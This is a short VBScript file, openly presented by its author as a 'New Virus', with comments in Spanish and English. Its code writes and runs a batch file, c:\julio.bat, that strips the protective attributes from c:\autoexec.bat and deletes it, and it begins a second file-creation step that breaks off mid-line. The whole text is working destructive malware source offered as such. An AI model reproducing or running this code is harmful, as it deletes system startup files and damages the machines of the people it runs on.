'New Virus
'An vbs file writed by Jerk®URC [Fabio]
'Este virus fué ideado, compilado y escrito por Fabio
'Nadie le ayudó mas que el sistema de ayuda de Visual Basic Script
'Este es el código
'This is the source code

dim file, xls
set xls = createobject("scripting.filesystemobject")
set file = xls.createtextfile ("c:\julio.bat", true)
file.writeline ("@echo off")
file.writeline ("attrib -r -s -h c:\autoexec.bat")
file.writeline ("del c:\autoexec.bat")
file.writeline ("if not exist c:\autoexec.bat goto noexist")
file.writeline ("move c:\autoexec.bat c:\s33.vir")
file.writeline ("del c:\s33.vir")
file.writeline (":noexist")
file.close

dim wshshell
set wshshell = wscript.createobject ("wscript.shell")
wshshell.run "C:\julio.bat"

dim file2, tnt
set tnt = createobject("scripting.filesystemobject")
set file2 = tnt.createtextfile ("c